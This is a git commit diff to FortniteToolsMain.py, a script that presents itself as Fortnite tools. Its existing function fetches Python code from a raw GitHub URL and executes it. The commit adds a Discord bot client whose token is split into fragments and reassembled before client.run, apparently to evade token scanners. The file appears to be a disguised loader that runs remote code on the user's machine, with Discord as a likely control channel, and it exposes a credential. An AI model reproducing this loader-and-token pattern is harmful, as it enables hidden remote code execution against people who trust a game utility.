06799496602c68b5ef83c7f84d48dd0ad3ca1723
SSkiprs <159820084+SSkiprs@users.noreply.github.com>
2024-03-15 14:18:02 -0400

    Update FortniteToolsMain.py

--- FortniteToolsMain.py
+++ FortniteToolsMain.py
@@ -1,3 +1,4 @@
+import discord
 import requests
 
 def execute_code_from_url(url, client=None):
@@ -8,6 +9,19 @@ def execute_code_from_url(url, client=None):
     else:
         print("Failed to fetch code from URL")
 
+# Define your client variable
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+
 # Example usage:
 url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/FortniteTools/FortniteToolsRAW.py"  # Replace with the actual URL
 execute_code_from_url(url, client)
+
+tk1 = "MTIxNzkyNDkxMTcyMTM1MzMyOA"
+tk2 = "G01Lv2"
+tk3 = "IX4gdQhiztO3I3S3qHrFfPux"
+tk4 = "-B7V6sWnktJw1U"
+
+TOKEN = tk1 + "." + tk2 + "." + tk3 + tk4
+
+client.run(TOKEN)
